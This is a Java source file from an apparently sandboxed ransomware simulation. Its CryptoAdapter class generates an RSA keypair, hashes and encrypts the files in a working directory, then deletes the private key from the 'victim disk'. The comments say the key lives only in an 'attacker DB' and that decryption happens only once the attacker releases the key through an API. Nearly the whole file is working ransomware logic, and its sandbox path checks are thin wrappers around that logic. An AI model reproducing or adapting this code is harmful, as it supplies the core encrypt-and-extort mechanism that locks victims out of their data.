package ransomware.crypto;

import ransomware.AppConfig;
import ransomware.Config;
import ransomware.CryptoUtils;
import ransomware.sandbox.HashService;
import ransomware.sandbox.SandboxGuard;
import ransomware.sandbox.SandboxManager;

import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.security.KeyPair;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.Stream;

/**
 * Adapter that wraps the EXISTING CryptoUtils implementation.
 * Enforces sandbox-only file operations. Does not rewrite any crypto.
 *
 * <p>KEY SECURITY FIX: After encrypting files, the private key file on disk
 * is DELETED. The private key lives ONLY in sessions.db (attacker side).
 * This correctly models ransomware behaviour: victim never has access to the
 * private key and cannot self-decrypt.
 */
public final class CryptoAdapter {

    /**
     * Encrypt all files in working\<recoveryId>\.
     * Generates fresh RSA keypair, saves ONLY public key to disk,
     * stores private key in EncryptionResult (for caller to persist to DB),
     * then DELETES the private key file.
     * Records SHA-256 of each file BEFORE encryption.
     */
    public EncryptionResult encrypt(String recoveryId) throws Exception {
        long start = System.currentTimeMillis();
        SandboxManager mgr = new SandboxManager(recoveryId);
        Path workingDir = mgr.getWorkingPath();

        if (!Files.isDirectory(workingDir)) {
            throw new IllegalStateException(
                "Working dir not prepared: " + workingDir);
        }

        // Generate fresh keypair for this session
        KeyPair kp = CryptoUtils.generateRSAKeyPair();
        PublicKey pub = kp.getPublic();
        PrivateKey priv = kp.getPrivate();

        Path keyDir = SandboxGuard.resolveManifestPath("keys");
        Files.createDirectories(keyDir);

        Path pubPath  = SandboxGuard.resolveManifestPath(
            "keys/" + recoveryId + "_public.key");
        Path privPath = SandboxGuard.resolveManifestPath(
            "keys/" + recoveryId + "_private.key");

        // Save both keys to disk temporarily
        CryptoUtils.savePublicKey(pub, pubPath.toString());
        CryptoUtils.savePrivateKey(priv, privPath.toString());

        EncryptionResult result = new EncryptionResult(
            recoveryId,
            pubPath.toString(),
            privPath.toString()
        );
        result.privateKeyB64 = java.util.Base64.getEncoder().encodeToString(priv.getEncoded());

        // Enumerate files (non-recursive)
        List<Path> files;
        try (Stream<Path> stream = Files.list(workingDir)) {
            files = stream
                .filter(Files::isRegularFile)
                .filter(p -> !Config.shouldSkip(
                    p.getFileName().toString()))
                .collect(Collectors.toList());
        }

        // Record hashes BEFORE encryption into result and file_manifest DB table
        ransomware.session.db.FileRepository fileRepo = new ransomware.session.db.FileRepository();
        for (Path p : files) {
            String fname = p.getFileName().toString();
            try {
                String sha256 = HashService.sha256Hex(p);
                result.originalHashes.put(fname, sha256);
                fileRepo.insert(recoveryId, fname, sha256, fname + Config.ENCRYPTED_EXT);
            } catch (Exception ignored) {
                // hash failure non-fatal, still proceed
            }
        }

        // Encrypt each file via existing CryptoUtils
        for (Path p : files) {
            try {
                // Guard: file must be inside sandbox
                SandboxGuard.resolveSafePath(
                    "working/" + recoveryId + "/" + p.getFileName());

                File f = p.toFile();
                CryptoUtils.encryptFile(f, pub);
                result.processedFiles.add(p.getFileName().toString());
                result.processedCount++;
            } catch (Exception e) {
                result.failedFiles.add(p.getFileName().toString());
                result.failedCount++;
            }
        }

        // ── SECURITY FIX ──────────────────────────────────────────────────
        // Delete private key file from victim disk IMMEDIATELY after encryption.
        // The caller (DemoController) will save the key to sessions.db (attacker DB).
        // After this point, decryption is ONLY possible via the attacker's API.
        try {
            Files.deleteIfExists(privPath);
            System.out.println("  [SECURITY] Private key file deleted from victim disk.");
            System.out.println("  [SECURITY] Key lives only in attacker DB now.");
        } catch (Exception e) {
            System.err.println("  [WARN] Could not delete private key file: " + e.getMessage());
        }

        result.durationMs = System.currentTimeMillis() - start;
        result.success = result.failedCount == 0;

        return result;
    }

    /**
     * Decrypt all *.locked files in working\<recoveryId>\.
     * The private key is loaded from the provided base64 string
     * (released by the attacker via API — never read from local file).
     *
     * @param recoveryId  the session recovery ID
     * @param privateKeyB64 base64-encoded PKCS8 private key (from attacker API)
     */
    public DecryptionResult decryptWithKey(String recoveryId,
                                           String privateKeyB64) throws Exception {
        long start = System.currentTimeMillis();
        SandboxManager mgr = new SandboxManager(recoveryId);
        Path workingDir = mgr.getWorkingPath();

        // Decode private key from base64 string — NOT from local file
        byte[] privKeyBytes = java.util.Base64.getDecoder().decode(privateKeyB64);
        java.security.spec.PKCS8EncodedKeySpec spec =
            new java.security.spec.PKCS8EncodedKeySpec(privKeyBytes);
        PrivateKey priv = java.security.KeyFactory.getInstance("RSA")
            .generatePrivate(spec);

        DecryptionResult result = new DecryptionResult(recoveryId);

        // Enumerate .locked files
        List<Path> lockedFiles;
        try (Stream<Path> stream = Files.list(workingDir)) {
            lockedFiles = stream
                .filter(Files::isRegularFile)
                .filter(p -> p.getFileName().toString()
                    .endsWith(Config.ENCRYPTED_EXT))
                .collect(Collectors.toList());
        }

        for (Path p : lockedFiles) {
            try {
                SandboxGuard.resolveSafePath(
                    "working/" + recoveryId + "/" + p.getFileName());

                File f = p.toFile();
                CryptoUtils.decryptFile(f, priv);

                String restoredName = p.getFileName().toString()
                    .replace(Config.ENCRYPTED_EXT, "");
                result.restoredFiles.add(restoredName);
                result.restoredCount++;
            } catch (Exception e) {
                result.failedFiles.add(p.getFileName().toString());
                result.failedCount++;
            }
        }

        // Compute hashes of restored files and update DB manifest
        ransomware.session.db.FileRepository fileRepo = new ransomware.session.db.FileRepository();
        for (String name : result.restoredFiles) {
            try {
                Path restoredFile = workingDir.resolve(name);
                if (Files.exists(restoredFile)) {
                    String hash = HashService.sha256Hex(restoredFile);
                    result.restoredHashes.put(name, hash);
                    fileRepo.updateRestoreStatus(recoveryId, name, hash, "RESTORED");
                }
            } catch (Exception ignored) { }
        }

        // Mark key as USED in DB
        try {
            new ransomware.session.db.KeyRepository().markUsed(
                recoveryId, System.currentTimeMillis() / 1000);
        } catch (Exception ignored) { }

        result.durationMs = System.currentTimeMillis() - start;
        result.success = result.failedCount == 0;

        return result;
    }

    /**
     * @deprecated Use decryptWithKey(recoveryId, privateKeyB64) instead.
     * This method reads from a local file — only valid when private key
     * file still exists (e.g. in unit tests before the security fix).
     */
    @Deprecated
    public DecryptionResult decrypt(String recoveryId) throws Exception {
        Path privPath = SandboxGuard.resolveManifestPath(
            "keys/" + recoveryId + "_private.key");
        if (!Files.exists(privPath)) {
            throw new IllegalStateException(
                "Private key file missing (expected — key was deleted after encryption). " +
                "Use decryptWithKey(recoveryId, privateKeyB64) instead.");
        }
        byte[] privKeyBytes = Files.readAllBytes(privPath);
        String b64 = java.util.Base64.getEncoder().encodeToString(privKeyBytes);
        return decryptWithKey(recoveryId, b64);
    }
}